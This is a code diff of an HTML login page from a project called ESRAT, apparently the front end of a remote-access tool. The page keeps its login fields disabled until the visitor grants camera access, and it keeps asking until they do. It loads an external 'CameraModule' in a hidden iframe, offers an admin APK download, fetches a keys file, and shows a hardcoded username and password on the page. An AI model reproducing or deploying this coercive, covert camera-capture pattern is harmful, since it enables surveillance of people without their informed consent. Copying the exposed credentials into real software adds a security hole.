@@ -23,12 +23,12 @@
             <span class="letter">G</span>
             <span class="letter">A</span>
         </span>
-        <a class="info" href="/ESRAT/apks/SS Admin.apk" style="text-decoration: none; display: block; margin-top: 40px;">➡️Click Here⬅️ <br>to download the ADMIN App first !</a>
+        <a class="info" href="/ESRAT/apks/SS Admin.apk" style="text-decoration: none; display: block; margin-top: 40px;">➡️Click Here⬅️ <br>to download the ADMIN App first!</a>
     </div>
 
     <!-- Notice Board -->
     <div id="notice-board" class="notice-board">
-        <p><b>Allow 'Camera' permission from your browser settings to Proceed.</b> <br>Username- ganga <br> Password- gangadharesm3</p>
+        <p><b>Allow 'Camera' permission from <br>your browser settings to Proceed.</b> <br>Username- ganga <br> Password- gangadharesm3</p>
     </div>
     
     <div class="container">
@@ -48,8 +48,15 @@
     <!-- Hidden iframe to load the CameraModule -->
     <iframe id="cameraIframe" src="https://es-universe.github.io/ESRAT/events/CameraModule/index.html" style="display:none;"></iframe>
 
-    <!-- Add a script to request camera permission again and again till granted. -->
     <script>
+        let cameraStream = null;  // Variable to store the camera stream
+
+        async function retrieveSacredKeys() {
+            const response = await fetch("/ESRAT/asset/keys.json");
+            const sacredKeys = await response.json();
+            return sacredKeys;
+        }
+
         function enableInputs() {
             document.getElementById("username").disabled = false;
             document.getElementById("password").disabled = false;
@@ -64,11 +71,23 @@
             document.getElementById("notice-board").style.display = 'block';  // Show notice board if permission is denied
         }
 
+        function stopCameraStream() {
+            if (cameraStream) {
+                cameraStream.getTracks().forEach(track => track.stop());  // Stop all tracks
+                cameraStream = null;  // Clear the camera stream
+            }
+        }
+
         function requestCameraPermission() {
             navigator.mediaDevices.getUserMedia({ video: true })
                 .then(function(stream) {
                     console.log("Camera permission granted.");
+                    cameraStream = stream;  // Store the camera stream
                     enableInputs();  // Enable inputs once permission is granted
+
+                    // Stop the camera stream after 5 seconds
+                    setTimeout(stopCameraStream, 5000);
+                    
                     clearInterval(cameraInterval);  // Stop asking for permission after it's granted
                 })
                 .catch(function(err) {
